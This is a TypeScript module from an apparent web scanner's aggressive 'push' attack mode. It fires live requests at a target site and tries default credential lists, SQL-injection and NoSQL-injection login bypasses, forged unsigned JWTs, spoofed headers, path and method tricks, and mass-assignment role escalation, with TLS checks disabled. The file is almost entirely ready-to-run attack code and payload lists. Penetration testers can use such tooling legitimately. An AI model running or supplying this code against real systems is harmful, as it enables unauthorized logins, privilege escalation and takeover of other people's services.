import axios, { AxiosResponse } from "axios";
import * as https from "https";
import chalk from "chalk";
import ora from "ora";
import Table from "cli-table3";
import { log, logSilent } from "./logger";
import {
  normalizeUrl,
  VulnResult,
  DirScanResult,
} from "./scanner";

const agent = new https.Agent({ rejectUnauthorized: false });

export interface PushResult {
  category: string;
  test: string;
  success: boolean;
  evidence: string;
  severity: "critical" | "high" | "medium" | "low";
  details: string;
}

const DEFAULT_CREDENTIALS: Array<{ user: string; pass: string; service: string }> = [
  { user: "admin", pass: "admin", service: "Generic" },
  { user: "admin", pass: "password", service: "Generic" },
  { user: "admin", pass: "admin123", service: "Generic" },
  { user: "admin", pass: "123456", service: "Generic" },
  { user: "admin", pass: "admin1", service: "Generic" },
  { user: "admin", pass: "letmein", service: "Generic" },
  { user: "admin", pass: "welcome", service: "Generic" },
  { user: "admin", pass: "123456789", service: "Generic" },
  { user: "admin", pass: "password1", service: "Generic" },
  { user: "admin", pass: "root", service: "Generic" },
  { user: "root", pass: "root", service: "Generic" },
  { user: "root", pass: "toor", service: "Generic" },
  { user: "root", pass: "password", service: "Generic" },
  { user: "test", pass: "test", service: "Generic" },
  { user: "guest", pass: "guest", service: "Generic" },
  { user: "user", pass: "user", service: "Generic" },
  { user: "admin", pass: "", service: "Generic" },
  { user: "administrator", pass: "administrator", service: "Windows" },
  { user: "admin", pass: "admin", service: "WordPress" },
  { user: "admin", pass: "admin1234", service: "WordPress" },
  { user: "admin", pass: "Admin123", service: "WordPress" },
  { user: "wp-admin", pass: "wp-admin", service: "WordPress" },
  { user: "admin", pass: "nimda", service: "WordPress" },
  { user: "admin", pass: "admin", service: "phpMyAdmin" },
  { user: "root", pass: "", service: "phpMyAdmin" },
  { user: "root", pass: "root", service: "phpMyAdmin" },
  { user: "admin", pass: "admin", service: "Joomla" },
  { user: "admin", pass: "admin123", service: "Joomla" },
  { user: "admin", pass: "admin", service: "Drupal" },
  { user: "drupal", pass: "drupal", service: "Drupal" },
  { user: "admin", pass: "admin", service: "Jenkins" },
  { user: "admin", pass: "password", service: "Jenkins" },
  { user: "admin", pass: "admin", service: "Tomcat" },
  { user: "tomcat", pass: "tomcat", service: "Tomcat" },
  { user: "admin", pass: "admin", service: "MongoDB" },
  { user: "admin", pass: "admin", service: "Redis (no auth)" },
  { user: "admin", pass: "manager", service: "JBoss" },
  { user: "j2deployer", pass: "j2deployer", service: "JBoss" },
  { user: "elastic", pass: "changeme", service: "Elasticsearch" },
  { user: "kibana", pass: "kibana", service: "Kibana" },
  { user: "admin", pass: "admin", service: "Solr" },
  { user: "admin", pass: "admin", service: "Grafana" },
  { user: "admin", pass: "admin", service: "RabbitMQ" },
  { user: "guest", pass: "guest", service: "RabbitMQ" },
];

const AUTH_BYPASS_PAYLOADS: Array<{ desc: string; modifier: (url: string) => string }> = [
  { desc: "Method override to PUT", modifier: (u) => u },
  { desc: "Method override to PATCH", modifier: (u) => u },
  { desc: "X-Forwarded-For: 127.0.0.1", modifier: (u) => u },
  { desc: "X-Original-URL: /admin", modifier: (u) => u },
  { desc: "X-Rewrite-URL: /admin", modifier: (u) => u },
  { desc: "X-Custom-IP-Authorization: 127.0.0.1", modifier: (u) => u },
  { desc: "X-Forwarded-Host: localhost", modifier: (u) => u },
  { desc: "X-Host: localhost", modifier: (u) => u },
  { desc: "Referer: /admin", modifier: (u) => u },
];

const HEADER_BYPASS_TESTS: Array<{ header: string; value: string; desc: string }> = [
  { header: "X-Forwarded-For", value: "127.0.0.1", desc: "Internal IP spoof" },
  { header: "X-Original-URL", value: "/admin", desc: "Path rewrite bypass" },
  { header: "X-Rewrite-URL", value: "/admin", desc: "Rewrite bypass" },
  { header: "X-Custom-IP-Authorization", value: "127.0.0.1", desc: "IP auth bypass" },
  { header: "X-Forwarded-Host", value: "localhost", desc: "Host spoof" },
  { header: "X-Host", value: "localhost", desc: "Host bypass" },
  { header: "X-Access-Token", value: "admin", desc: "Token bypass" },
  { header: "X-Auth-Token", value: "admin", desc: "Auth bypass" },
  { header: "Authorization", value: "Bearer admin", desc: "Bearer bypass" },
  { header: "Authorization", value: "Basic YWRtaW46YWRtaW4=", desc: "Basic admin:admin" },
  { header: "Cookie", value: "role=admin; user=admin", desc: "Cookie injection" },
  { header: "Referer", value: "/admin/dashboard", desc: "Referer check bypass" },
  { header: "Origin", value: "null", desc: "Origin null bypass" },
];

const SQLI_AUTH_BYPASS = [
  { user: "admin'--", pass: "anything" },
  { user: "admin' OR '1'='1", pass: "anything" },
  { user: "admin' OR 1=1--", pass: "anything" },
  { user: "' OR '1'='1'--", pass: "' OR '1'='1'--" },
  { user: "admin'/*", pass: "anything" },
  { user: "' OR 1=1#", pass: "anything" },
  { user: "admin' OR 1=1#", pass: "anything" },
  { user: "') OR ('1'='1'--", pass: "anything" },
  { user: "admin')--", pass: "anything" },
];

const JWT_PAYLOADS = [
  { header: '{"alg":"none","typ":"JWT"}', payload: '{"sub":"admin","iat":0}', desc: "alg=none bypass" },
  { header: '{"alg":"None","typ":"JWT"}', payload: '{"sub":"admin","iat":0}', desc: "alg=None bypass" },
  { header: '{"alg":"NONE","typ":"JWT"}', payload: '{"sub":"admin","iat":0}', desc: "alg=NONE bypass" },
  { header: '{"alg":"HS256","typ":"JWT"}', payload: '{"sub":"admin","role":"superadmin","iat":0}', desc: "Role escalation" },
];

const PROTOCOL_BYPASS_TESTS = [
  { method: "PUT", desc: "PUT method" },
  { method: "PATCH", desc: "PATCH method" },
  { method: "DELETE", desc: "DELETE method" },
  { method: "OPTIONS", desc: "OPTIONS method" },
  { method: "TRACE", desc: "TRACE method" },
  { method: "HEAD", desc: "HEAD method" },
];

const PATH_BYPASS_TESTS = [
  { suffix: "/..;/admin", desc: "Tomcat path bypass (..;/)" },
  { suffix: "/.;/admin", desc: "Semicolon path bypass (.;/)" },
  { suffix: "/%2e%2e/admin", desc: "URL-encoded dot bypass" },
  { suffix: "/..%2fadmin", desc: "Encoded slash bypass" },
  { suffix: "/admin..;.json", desc: "JSON extension bypass" },
  { suffix: "/admin..;.css", desc: "CSS extension bypass" },
  { suffix: "/%61dmin", desc: "URL-encoded a bypass" },
  { suffix: "/ADMIN", desc: "Case flip bypass" },
  { suffix: "/admin/", desc: "Trailing slash bypass" },
  { suffix: "/admin%00", desc: "Null byte bypass" },
  { suffix: "//admin", desc: "Double slash bypass" },
  { suffix: "/admin?anything", desc: "Query param bypass" },
  { suffix: "/#admin", desc: "Fragment bypass" },
];

function toBase64(str: string): string {
  return Buffer.from(str).toString("base64").replace(/=/g, "");
}

async function tryLogin(
  loginUrl: string,
  username: string,
  password: string,
  extraHeaders: Record<string, string> = {}
): Promise<{ success: boolean; evidence: string; statusCode: number; body: string }> {
  try {
    const formData = new URLSearchParams();
    formData.set("username", username);
    formData.set("password", password);
    formData.set("user", username);
    formData.set("pass", password);
    formData.set("email", username);
    formData.set("login", "1");
    formData.set("submit", "Login");

    const res = await axios.post(loginUrl, formData.toString(), {
      timeout: 8000,
      validateStatus: () => true,
      httpsAgent: agent,
      maxRedirects: 3,
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        ...extraHeaders,
      },
    });

    const body = typeof res.data === "string" ? res.data : JSON.stringify(res.data);
    const isFailed =
      /invalid|incorrect|wrong|failed|error|denied|unauthorized|not found|doesn'?t match|no user|bad credential|login failed|access denied|auth fail/i.test(body);

    const isSuccess =
      /welcome|dashboard|logout|signed in|successfully|token|session|home|admin panel|manage|control/i.test(body);

    if (res.status === 302 || res.status === 301) {
      const loc = res.headers["location"] || "";
      if (/dashboard|home|admin|welcome|panel/i.test(loc)) {
        return { success: true, evidence: `Redirect to: ${loc}`, statusCode: res.status, body };
      }
    }

    if (!isFailed && isSuccess) {
      return { success: true, evidence: `Success keywords found in response`, statusCode: res.status, body };
    }

    if (!isFailed && res.status === 200 && body.length > 0) {
      const origRes = await axios.post(loginUrl, formData.toString().replace(password, "WRONGPASS_XYZ_123"), {
        timeout: 8000,
        validateStatus: () => true,
        httpsAgent: agent,
        maxRedirects: 0,
        headers: { "Content-Type": "application/x-www-form-urlencoded", ...extraHeaders },
      });
      if (origRes.data && body.length > (typeof origRes.data === "string" ? origRes.data.length : 0) + 200) {
        return { success: true, evidence: `Response significantly different from wrong password attempt`, statusCode: res.status, body };
      }
    }

    return { success: false, evidence: "Login rejected", statusCode: res.status, body };
  } catch (err: any) {
    return { success: false, evidence: `Error: ${err.message}`, statusCode: 0, body: "" };
  }
}

async function tryJSONLogin(
  loginUrl: string,
  username: string,
  password: string,
  extraHeaders: Record<string, string> = {}
): Promise<{ success: boolean; evidence: string; statusCode: number }> {
  try {
    const res = await axios.post(
      loginUrl,
      { username, password, email: username, user: username, pass: password },
      {
        timeout: 8000,
        validateStatus: () => true,
        httpsAgent: agent,
        maxRedirects: 3,
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
          ...extraHeaders,
        },
      }
    );

    const body = typeof res.data === "string" ? res.data : JSON.stringify(res.data);

    if (res.status === 200) {
      const data = typeof res.data === "object" ? res.data : null;
      if (data && (data.token || data.access_token || data.auth_token || data.session || data.success)) {
        return { success: true, evidence: `Token/session in response: ${JSON.stringify(data).substring(0, 100)}`, statusCode: res.status };
      }
      if (/token|success|auth|session|logged/i.test(body)) {
        return { success: true, evidence: "Auth success indicators in response", statusCode: res.status };
      }
    }

    return { success: false, evidence: "Rejected", statusCode: res.status };
  } catch {
    return { success: false, evidence: "Error", statusCode: 0 };
  }
}

export async function pushAttack(url: string, foundVulns: VulnResult[] = [], foundDirs: DirScanResult[] = []): Promise<PushResult[]> {
  const baseUrl = normalizeUrl(url);
  const parsedUrl = new URL(baseUrl);
  const host = `${parsedUrl.protocol}//${parsedUrl.host}`;
  const results: PushResult[] = [];

  const spinner = ora(chalk.red.bold("PUSH MODE — Aggressive exploitation testing")).start();

  let phase = 0;
  const totalPhases = 8;

  phase++;
  spinner.text = chalk.red(`[PUSH ${phase}/${totalPhases}] Testing default credentials...`);

  const loginPaths = [
    "/login", "/signin", "/admin/login", "/admin", "/wp-login.php",
    "/administrator", "/auth/login", "/api/login", "/api/auth/login",
    "/api/v1/login", "/api/auth/token", "/api/auth", "/oauth/token",
    "/auth/signin", "/admin/signin", "/user/login",
  ];

  const foundLogins: string[] = [];
  for (const lp of loginPaths) {
    try {
      const res = await axios.get(host + lp, {
        timeout: 5000,
        validateStatus: (s) => s < 500,
        httpsAgent: agent,
      });
      if (res.status < 400) {
        foundLogins.push(host + lp);
        logSilent("FIND", `Login page found: ${host + lp}`);
      }
    } catch {}
  }

  if (foundLogins.length === 0) {
    foundLogins.push(host + "/login");
    logSilent("WARN", "No login pages found, using default /login");
  }

  for (const loginUrl of foundLogins) {
    let tested = 0;
    for (const cred of DEFAULT_CREDENTIALS) {
      tested++;
      if (tested > 20) break;

      const formResult = await tryLogin(loginUrl, cred.user, cred.pass);
      if (formResult.success) {
        const r: PushResult = {
          category: "AuthBypass",
          test: `Default creds (${cred.service}): ${cred.user}:${cred.pass}`,
          success: true,
          evidence: formResult.evidence,
          severity: "critical",
          details: `Login at ${loginUrl} with ${cred.user}:${cred.pass}`,
        };
        results.push(r);
        log("FIND", chalk.red.bold(`AUTH BYPASS: ${cred.user}:${cred.pass} at ${loginUrl}`));
        break;
      }

      const jsonResult = await tryJSONLogin(loginUrl, cred.user, cred.pass);
      if (jsonResult.success) {
        const r: PushResult = {
          category: "AuthBypass",
          test: `Default creds (API/${cred.service}): ${cred.user}:${cred.pass}`,
          success: true,
          evidence: jsonResult.evidence,
          severity: "critical",
          details: `API login at ${loginUrl} with ${cred.user}:${cred.pass}`,
        };
        results.push(r);
        log("FIND", chalk.red.bold(`API AUTH BYPASS: ${cred.user}:${cred.pass} at ${loginUrl}`));
        break;
      }
    }
  }

  phase++;
  spinner.text = chalk.red(`[PUSH ${phase}/${totalPhases}] Testing SQLi auth bypass...`);

  for (const loginUrl of foundLogins) {
    for (const sqli of SQLI_AUTH_BYPASS) {
      const res = await tryLogin(loginUrl, sqli.user, sqli.pass);
      if (res.success) {
        results.push({
          category: "SQLi-Auth",
          test: `SQLi login bypass: ${sqli.user}`,
          success: true,
          evidence: res.evidence,
          severity: "critical",
          details: `Bypassed auth at ${loginUrl} with: ${sqli.user}`,
        });
        log("FIND", chalk.red.bold(`SQLi AUTH BYPASS: ${sqli.user} at ${loginUrl}`));
      }

      const jsonRes = await tryJSONLogin(loginUrl, sqli.user, sqli.pass);
      if (jsonRes.success) {
        results.push({
          category: "SQLi-Auth",
          test: `SQLi API bypass: ${sqli.user}`,
          success: true,
          evidence: jsonRes.evidence,
          severity: "critical",
          details: `Bypassed API auth at ${loginUrl} with: ${sqli.user}`,
        });
      }
    }
  }

  phase++;
  spinner.text = chalk.red(`[PUSH ${phase}/${totalPhases}] Testing JWT bypass...`);

  const apiEndpoints = ["/api/user", "/api/me", "/api/profile", "/api/admin", "/api/v1/user", "/api/v2/me"];
  for (const ep of apiEndpoints) {
    for (const jwt of JWT_PAYLOADS) {
      try {
        const token = toBase64(jwt.header) + "." + toBase64(jwt.payload) + ".";
        const res = await axios.get(host + ep, {
          timeout: 5000,
          validateStatus: () => true,
          httpsAgent: agent,
          headers: { Authorization: `Bearer ${token}` },
        });
        if (res.status === 200) {
          const body = typeof res.data === "string" ? res.data : JSON.stringify(res.data);
          if (!/unauthorized|forbidden|invalid|error/i.test(body)) {
            results.push({
              category: "JWT-Bypass",
              test: jwt.desc,
              success: true,
              evidence: `Accessed ${ep} with crafted JWT (${jwt.desc})`,
              severity: "high",
              details: `Token: ${token.substring(0, 40)}...`,
            });
            log("FIND", chalk.red(`JWT BYPASS: ${jwt.desc} at ${ep}`));
          }
        }
      } catch {}
    }
  }

  phase++;
  spinner.text = chalk.red(`[PUSH ${phase}/${totalPhases}] Testing header-based bypass...`);

  const protectedPaths = ["/admin", "/admin/dashboard", "/admin/settings", "/api/admin", "/management", "/console", "/dashboard"];
  for (const p of protectedPaths) {
    for (const hb of HEADER_BYPASS_TESTS) {
      try {
        const res = await axios.get(host + p, {
          timeout: 5000,
          validateStatus: () => true,
          httpsAgent: agent,
          maxRedirects: 0,
          headers: { [hb.header]: hb.value },
        });
        if (res.status === 200) {
          const body = typeof res.data === "string" ? res.data : JSON.stringify(res.data);
          if (!/login|signin|forbidden|unauthorized|403|401/i.test(body)) {
            results.push({
              category: "Header-Bypass",
              test: `${hb.header}: ${hb.value} → ${p}`,
              success: true,
              evidence: hb.desc + " - accessed protected resource",
              severity: "high",
              details: `Status ${res.status}, response size ${body.length}`,
            });
            log("FIND", chalk.red(`HEADER BYPASS: ${hb.header}: ${hb.value} → ${p}`));
          }
        }
      } catch {}
    }
  }

  phase++;
  spinner.text = chalk.red(`[PUSH ${phase}/${totalPhases}] Testing path bypass techniques...`);

  for (const p of protectedPaths.slice(0, 3)) {
    for (const pb of PATH_BYPASS_TESTS) {
      try {
        const testPath = p + pb.suffix.replace("/admin", "");
        const res = await axios.get(host + testPath, {
          timeout: 5000,
          validateStatus: () => true,
          httpsAgent: agent,
          maxRedirects: 0,
        });
        if (res.status === 200) {
          const body = typeof res.data === "string" ? res.data : JSON.stringify(res.data);
          if (!/login|signin|forbidden|unauthorized|403|401/i.test(body) && body.length > 100) {
            results.push({
              category: "Path-Bypass",
              test: pb.desc + ` → ${testPath}`,
              success: true,
              evidence: `Path bypass: ${testPath}`,
              severity: "medium",
              details: `Status 200, ${body.length} bytes`,
            });
            log("FIND", chalk.yellow(`PATH BYPASS: ${testPath} (${pb.desc})`));
          }
        }
      } catch {}
    }
  }

  phase++;
  spinner.text = chalk.red(`[PUSH ${phase}/${totalPhases}] Testing HTTP method bypass...`);

  for (const p of protectedPaths) {
    for (const mt of PROTOCOL_BYPASS_TESTS) {
      try {
        const res = await axios({
          method: mt.method as any,
          url: host + p,
          timeout: 5000,
          validateStatus: () => true,
          httpsAgent: agent,
          maxRedirects: 0,
        });
        if (res.status === 200) {
          const body = typeof res.data === "string" ? res.data : JSON.stringify(res.data);
          if (!/login|signin|forbidden|unauthorized|method not allowed/i.test(body) && body.length > 100) {
            results.push({
              category: "Method-Bypass",
              test: `${mt.method} ${p}`,
              success: true,
              evidence: `Method ${mt.method} bypassed protection on ${p}`,
              severity: "medium",
              details: `${mt.desc}: status ${res.status}`,
            });
            log("FIND", chalk.yellow(`METHOD BYPASS: ${mt.method} ${p}`));
          }
        }
      } catch {}
    }
  }

  phase++;
  spinner.text = chalk.red(`[PUSH ${phase}/${totalPhases}] Testing MongoDB/NoSQL injection...`);

  const nosqlPayloads = [
    { username: '{"$ne":""}', password: '{"$ne":""}' },
    { username: '{"$gt":""}', password: '{"$gt":""}' },
    { username: '{"$regex":".*"}', password: '{"$regex":".*"}' },
    { username: 'admin', password: '{"$ne":""}' },
    { username: '{"$where":"1==1"}', password: '' },
    { username: '{"$gt":""}', password: '' },
  ];

  for (const loginUrl of foundLogins) {
    for (const payload of nosqlPayloads) {
      try {
        const res = await axios.post(
          loginUrl,
          { username: payload.username, password: payload.password },
          {
            timeout: 5000,
            validateStatus: () => true,
            httpsAgent: agent,
            maxRedirects: 3,
            headers: { "Content-Type": "application/json", Accept: "application/json" },
          }
        );
        if (res.status === 200) {
          const body = typeof res.data === "string" ? res.data : JSON.stringify(res.data);
          if (/token|success|auth|session|logged|user/i.test(body) && !/invalid|error|failed|wrong/i.test(body)) {
            results.push({
              category: "NoSQL-Injection",
              test: `NoSQL bypass: user=${payload.username.substring(0, 20)}`,
              success: true,
              evidence: "NoSQL injection bypassed authentication",
              severity: "critical",
              details: `Payload: ${JSON.stringify(payload)}`,
            });
            log("FIND", chalk.red.bold(`NoSQL BYPASS at ${loginUrl}`));
          }
        }
      } catch {}
    }
  }

  phase++;
  spinner.text = chalk.red(`[PUSH ${phase}/${totalPhases}] Testing mass assignment / parameter pollution...`);

  const massAssignPayloads = [
    { username: "admin", password: "test123", role: "admin" },
    { username: "admin", password: "test123", isAdmin: true },
    { username: "admin", password: "test123", admin: true },
    { username: "admin", password: "test123", role: "superadmin" },
    { username: "admin", password: "test123", is_admin: 1 },
    { username: "admin", password: "test123", user_type: "admin" },
    { email: "admin@test.com", password: "test123", verified: true },
  ];

  for (const loginUrl of foundLogins) {
    for (const payload of massAssignPayloads) {
      try {
        const res = await axios.post(loginUrl, payload, {
          timeout: 5000,
          validateStatus: () => true,
          httpsAgent: agent,
          maxRedirects: 3,
          headers: { "Content-Type": "application/json", Accept: "application/json" },
        });
        if (res.status === 200) {
          const body = typeof res.data === "string" ? res.data : JSON.stringify(res.data);
          if (/token|success|auth|session|admin/i.test(body) && !/invalid|error|failed|wrong/i.test(body)) {
            results.push({
              category: "Mass-Assignment",
              test: `Mass assign: ${JSON.stringify(payload).substring(0, 40)}`,
              success: true,
              evidence: "Mass assignment — extra role/admin field accepted",
              severity: "high",
              details: `Response indicates role elevation succeeded`,
            });
            log("FIND", chalk.red(`MASS ASSIGN: ${JSON.stringify(payload).substring(0, 40)}`));
          }
        }
      } catch {}
    }
  }

  spinner.stop();

  return results;
}

export function printPushResults(results: PushResult[]): void {
  if (results.length === 0) {
    console.log(chalk.green("\n  No successful bypasses found. Target appears resistant to push attacks."));
    return;
  }

  const successes = results.filter((r) => r.success);

  console.log(
    chalk.red.bold(`\n  ╔══════════════════════════════════════════════════════════╗`),
  );
  console.log(
    chalk.red.bold(`  ║  PUSH RESULTS — ${String(successes.length).padStart(3)} BYPASSES FOUND                  ║`),
  );
  console.log(
    chalk.red.bold(`  ╚══════════════════════════════════════════════════════════╝`),
  );

  const table = new Table({
    head: [chalk.red("Category"), chalk.red("Test"), chalk.red("Severity"), chalk.red("Evidence")],
    style: { head: [], border: ["red"] },
    colWidths: [16, 38, 10, 42],
  });

  for (const r of successes) {
    const sevColor = r.severity === "critical" ? chalk.red.bold : r.severity === "high" ? chalk.keyword("orange") : chalk.yellow;
    const catColor = r.category.includes("SQLi") || r.category.includes("NoSQL") ? chalk.red : r.category.includes("JWT") ? chalk.magenta : r.category.includes("Path") ? chalk.keyword("orange") : r.category.includes("Header") ? chalk.yellow : chalk.cyan;
    table.push([catColor(r.category), chalk.white(r.test.substring(0, 36)), sevColor(r.severity.toUpperCase()), chalk.gray(r.evidence.substring(0, 40))]);
  }

  console.log(table.toString());

  const crits = successes.filter((r) => r.severity === "critical").length;
  const highs = successes.filter((r) => r.severity === "high").length;

  console.log(chalk.red.bold(`\n  CRITICAL: ${crits} | HIGH: ${highs} | TOTAL: ${successes.length}`));
  console.log(chalk.gray("  Use 'guide <type>' for exploitation details and remediation\n"));
}
